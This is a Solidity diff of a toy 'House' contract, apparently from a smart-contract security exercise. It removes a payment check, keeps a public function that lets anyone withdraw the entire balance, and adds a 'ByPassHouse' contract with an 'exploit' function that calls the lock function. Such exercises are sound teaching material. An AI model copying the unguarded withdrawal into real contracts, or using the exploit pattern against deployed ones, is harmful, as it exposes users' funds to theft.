@@ -4,7 +4,7 @@ contract House {
     
     address private owner;
     address private mainContract;
-    uint256 private etherAmount;
+    uint256 public etherAmount;
     bool public lockedHouse = true;
     bytes32 private password;
     
@@ -16,15 +16,28 @@ contract House {
     }
     
     function openTheHouse(bytes32 _password) public payable {
-        require(msg.value == etherAmount);
         if (keccak256(abi.encodePacked(_password)) == password) {
             lockedHouse = false;
-            address(mainContract).call(abi.encodeWithSignature("ilfautunnom(uint8)", 1));
+            address(mainContract).call(abi.encodeWithSignature("setOrder(uint8)", 1));
         }
     }
     
-    function tupeuxenvoyerauxautres(address payable _lesautres) public {
-        _lesautres.transfer(address(this).balance);
+    function youCanWithdrawAllTheBalance(address payable _to) public {
+        _to.transfer(address(this).balance);
     }
     
+}
+
+contract ByPassHouse {
+    
+    address payable originalContract;
+    
+    constructor(address payable _originalContract) public payable {
+        originalContract = _originalContract;
+    }
+    
+    function exploit(bytes32 _password) public payable {
+        bytes memory payload = abi.encodeWithSignature("openTheHouse(bytes32)", _password);
+        originalContract.call.value(msg.value)(payload);
+    }
 }
